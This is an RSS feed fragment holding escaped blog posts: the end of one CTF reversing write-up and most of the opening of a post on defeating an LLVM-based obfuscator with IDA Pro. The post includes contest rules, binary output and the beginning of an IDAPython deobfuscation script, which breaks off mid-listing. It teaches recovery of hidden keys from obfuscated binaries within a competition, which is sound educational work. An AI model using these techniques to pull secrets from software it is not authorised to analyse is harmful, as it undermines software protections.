&lt;li&gt;Analyse the disassembly generated (pretty trivial)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#conclusion&#34;&gt;#&lt;/a&gt; Conclusion&lt;/h2&gt;
&lt;p&gt;I wanted this to be a one-of-a-kind challenge, since I had never seen many mixed mode samples in CTFs. I hope it served as kind of an intro to mixed mode analysis as well as reversing. And most of all I hope you guys had fun solving the challenge!&lt;/p&gt;
&lt;p&gt;As always, you can always reach out to me on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf&#34;&gt;Twitter/X&lt;/span&gt; if you have any doubts/suggestions. 😃&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://the-m3chanic.github.io/2025/05/12/Defeating-an-LLVM-based-obfuscator/</guid>
            <title>Defeating an LLVM based obfuscator with IDA Pro</title>
            <link>https://the-m3chanic.github.io/2025/05/12/Defeating-an-LLVM-based-obfuscator/</link>
            <category term="Writeup" scheme="https://the-m3chanic.github.io/categories/Writeup/" />
            <category term="LLVM" scheme="https://the-m3chanic.github.io/tags/LLVM/" />
            <category term="obfuscation" scheme="https://the-m3chanic.github.io/tags/obfuscation/" />
            <category term="reversing" scheme="https://the-m3chanic.github.io/tags/reversing/" />
            <pubDate>Mon, 12 May 2025 15:42:39 +0000</pubDate>
            <description><![CDATA[ &lt;h2 id=&#34;some-pretext&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#some-pretext&#34;&gt;#&lt;/a&gt; Some pretext&lt;/h2&gt;
&lt;p&gt;Me, Chandra and Sidharth recently placed 3rd in a Reverse Engineering Hackathon/CTF conducted by &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaWl0bS5hYy5pbg==&#34;&gt;IIT Madras&lt;/span&gt; and &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaWlpdGRtLmFjLmlu&#34;&gt;IIITDM Kancheepuram&lt;/span&gt;. This was very unique as it wasn&#39;t like any of the other RE focused CTFs we&#39;ve played before and the style was really different.&lt;/p&gt;
&lt;p&gt;The entire thing began with a CTF which had all categories you would expect in a normal CTF (RE, Pwn, Web, Forensics). Us being low level guys, managed to get down RE and Pwn, and took a bit of time with Forensics. Sadly Web was too guessy for us 😔 (blind + skill issue). They froze the scoreboard like 30 mins into the CTF but I figure we qualified since they sent us a mail for the next round.&lt;/p&gt;
&lt;p&gt;After the prelims CTF, I think the top 25-30 teams were picked for the next round. The next round was a RE specific CTF. That one was super easy except for one challenge which was broken, I think. They pushed a fix for it and then we solved that too. So far it was looking pretty normal and we weren&#39;t sure what the &amp;quot;hackathon&amp;quot; part of this was.&lt;/p&gt;
&lt;h3 id=&#34;what-is-a-hackathon-tho&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#what-is-a-hackathon-tho&#34;&gt;#&lt;/a&gt; What is a hackathon tho?&lt;/h3&gt;
&lt;p&gt;For context, a Hackathon is a software engineering/development oriented competition wherein teams are given certain topics/themes and guidelines to follow, and they have X amount of time to build a working product or a prototype, which they can then showcase to the judges and based on the judgement received they would get credited a certain number of points.&lt;/p&gt;
&lt;h2 id=&#34;defense-phase&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#defense-phase&#34;&gt;#&lt;/a&gt; Defense phase?&lt;/h2&gt;
&lt;p&gt;So after the 2 prelim rounds of CTFs, 20-25 teams were picked for the Hackathon (aka &amp;quot;Defense&amp;quot;) phase. This is where the uniqueness of the entire thing began. We were given a document that outlined what we would need to do and the specifications we were allowed to use. The entire specification is &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZG9jdW1lbnQvZC8xaUJHZ1NCeUdsRDkxdVdVT3o2QlRtQ1JweEN1N21IMUotcmZyTFBEdFdCRS9lZGl0&#34;&gt;here&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;TL;DR&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We are given a  &lt;code&gt;main.c&lt;/code&gt;  file, with 3 sensitive values:  &lt;code&gt;key&lt;/code&gt;  (a 16-byte AES Key),  &lt;code&gt;egg_params&lt;/code&gt;  (a 5x6 array) and a function  &lt;code&gt;compute_gf()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Each team is given the same core binary with the above 3 things changed&lt;/li&gt;
&lt;li&gt;You &amp;quot;defend&amp;quot; your binary by obfuscating it such that the 3 sensitive values are hard to recover&lt;/li&gt;
&lt;li&gt;You &amp;quot;attack&amp;quot; other binaries by reversing and getting those 3 values, and submit them as flags&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the defense phase, we were given criterion to follow with which we were to obfuscate our binaries. These were pretty basic, like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;No using any off the shelf obfuscators like UPX, CobaltStrike, etc.&lt;/li&gt;
&lt;li&gt;Code must be written by members of our team, and no one else&lt;/li&gt;
&lt;li&gt;The obfuscated binary must be functionally the same as the original, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Okay.. enough yap&lt;br /&gt;
This blog is more to focus on one of the challenges made by some folks at &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pbmZvc2VjaWl0ci5pbg==&#34;&gt;InfosecIITR&lt;/span&gt;.&lt;/p&gt;
&lt;p&gt;They made an LLVM based obfuscator, and while our challenge was something similar, it followed a different style from theirs. We went for a control flow flattening approach - while they went for more of a instruction overlap approach. It was an easy challenge, but I just wanted to showcase some cool things IDAPython is capable of.&lt;/p&gt;
&lt;h2 id=&#34;the-challenge&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#the-challenge&#34;&gt;#&lt;/a&gt; The Challenge&lt;/h2&gt;
&lt;p&gt;The binary itself had a behaviour exactly the same as the others in the competition - give it plaintext as a command line argument, and it would encrypt it and give it back to you.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;apollo@apollo:/mnt/f/Work/CTFs/binary-clash-25/attack-phase/3$ ./3_VMwhere&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Invalid Usage!!&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Usage: ./encrypt &amp;lt;plain_text&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;apollo@apollo:/mnt/f/Work/CTFs/binary-clash-25/attack-phase/3$ ./3_VMwhere hello&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Plaintext :: 68 65 6c 6c 6f 00 00 00 00 00 00 00 00 00 00 00&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ciphertext:: a0 6b 44 12 fc bd d2 a0 0c 71 d5 4b ba d6 84 94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Egg 0 : 0x28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Global Flag: 0x77&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now, looking at it in IDA, I wouldn&#39;t say it was the prettiest binary I&#39;ve ever seen.&lt;br /&gt;
If you look for the main function in the normal Linux ELF method (look for  &lt;code&gt;start&lt;/code&gt; , then find the first argument passed to the function -  &lt;code&gt;libc_start_main&lt;/code&gt;  - which is explicitly called by start), you will first off see that IDA marks it as a location and not a subroutine - meaning that something is off already.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/Defeating-an-LLVM-based-obfuscator/image.png&#34; alt=&#34;looking at start in IDA Pro&#34; /&gt;&lt;/p&gt;
&lt;p&gt;And at the location:&lt;br /&gt;
&lt;img data-src=&#34;/images/Defeating-an-LLVM-based-obfuscator/image-1.png&#34; alt=&#34;disassembly of main&#34; /&gt;&lt;/p&gt;
&lt;p&gt;That definitely does not look right.&lt;/p&gt;
&lt;p&gt;The  &lt;code&gt;jmp&lt;/code&gt;  at  &lt;code&gt;0x40B234&lt;/code&gt;  definitely looks suspicious, why is it jumping to the address of its own basic block + 5?&lt;/p&gt;
&lt;p&gt;You can press  &lt;code&gt;u&lt;/code&gt;  to undefine code at a given position in IDA, and  &lt;code&gt;c&lt;/code&gt;  to redefine it as code. Let us undefine code starting from  &lt;code&gt;0x40B228&lt;/code&gt; , and defone code starting at  &lt;code&gt;0x40B228 + 5&lt;/code&gt;  -&amp;gt;  &lt;code&gt;0x40B22D&lt;/code&gt; , and see where that takes us.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/Defeating-an-LLVM-based-obfuscator/image-2.png&#34; alt=&#34;hidden jump&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Looks like the code there is being interpreted as data, we can fix that easily (hit  &lt;code&gt;u&lt;/code&gt;  at that address and then hit  &lt;code&gt;c&lt;/code&gt; ). Doing so, gives us this&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/Defeating-an-LLVM-based-obfuscator/image-3.png&#34; alt=&#34;hidden jump but fr this time&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Well well well, what do we have here? A hidden  &lt;code&gt;jmp&lt;/code&gt;  instruction.&lt;/p&gt;
&lt;p&gt;Analysing the code at that location gives us similar looking stuff&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/Defeating-an-LLVM-based-obfuscator/image-4.png&#34; alt=&#34;2nd obfuscation place&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Applying the same stuff again, gives us the same results, except an instruction before the same old block again&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/Defeating-an-LLVM-based-obfuscator/image-7.png&#34; alt=&#34;jmp which leads to actual stuff&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Again, with this  &lt;code&gt;jmp&lt;/code&gt;  leading to a similar looking block, i.e:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;mov&lt;/code&gt;  a random 8-byte value into  &lt;code&gt;rax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;xor eax, eax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;jmp&lt;/code&gt;  into a location which is 5 bytes ahead of the basic block it belongs to, which will jump to a new location which may/may not have some code there, before it enters the same block again.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;At this point in the competition the pattern was clear to me, and I started figuring out a way to extract just the instructions we need (between the real  &lt;code&gt;jmp&lt;/code&gt;  and before the next obfuscated block). So I settled on writing down an IDAPython script for this, since I work mainly with IDA Pro anyways.&lt;/p&gt;
&lt;p&gt;My idea was this:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Look for instructions matching the format mentioned above&lt;/li&gt;
&lt;li&gt;If the instruction is found, then find the 5th byte offset from the start of the block, and extract the address of the real  &lt;code&gt;jmp&lt;/code&gt;  from on there&lt;/li&gt;
&lt;li&gt;At the new  &lt;code&gt;jmp&lt;/code&gt;  address, keep reading instructions until you meet the next instruction matching the block&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Rinse. Repeat.&lt;/p&gt;
&lt;p&gt;I wanted to take this as a chance to check out how good IDA&#39;s Python API was, and basically take it on a test drive.&lt;/p&gt;
&lt;p&gt;Now I had to write an IDA Script to this (🗿), ahem, so we shall do that next&lt;/p&gt;
&lt;p&gt;The IDA Python documentation isn&#39;t exactly the best (if someone actually does find something, please hit me up), so I kind of had to rely mostly on &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ncmVwLmFwcA==&#34;&gt;grep.app&lt;/span&gt; to see examples of stuff similar to what I want to do.&lt;/p&gt;
&lt;p&gt;Some time of dilly dallying, and I made a rough script to fix up the main function.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; ida_ua, idautils, idc, idaapi, ida_bytes, ida_funcs, ida_hexrays, ida_name, ida_idp, ida_segment&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ida_ua &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; insn_t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; collections &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; deque&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_register_map&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    reg_map = &amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    proc = ida_idp.ph.regnames&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; idx, reg_name &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;enumerate&lt;/span&gt;(proc):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; reg_name:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            reg_map[idx] = reg_name.lower()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; reg_map&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_instruction_at&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;address&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    insn = idaapi.insn_t()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    length = ida_ua.decode_insn(insn, address)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; length == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;f&amp;quot;0x&lt;span class=&#34;subst&#34;&gt;&amp;#123;address:x&amp;#125;&lt;/span&gt;: No valid instruction found&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mnemonic = insn.get_canon_mnem()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    disasm = idc.generate_disasm_line(address, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    clean_disasm = idaapi.tag_remove(disasm)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; clean_disasm:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        operand_part = clean_disasm.split(&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        operand_part = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bytes_data = ida_bytes.get_bytes(address, length)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hex_bytes = &lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;.join(&lt;span class=&#34;string&#34;&gt;f&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;b:02x&amp;#125;&lt;/span&gt;&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; b &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; bytes_data)&lt;/span&gt;&lt;br&gt;&lt;span 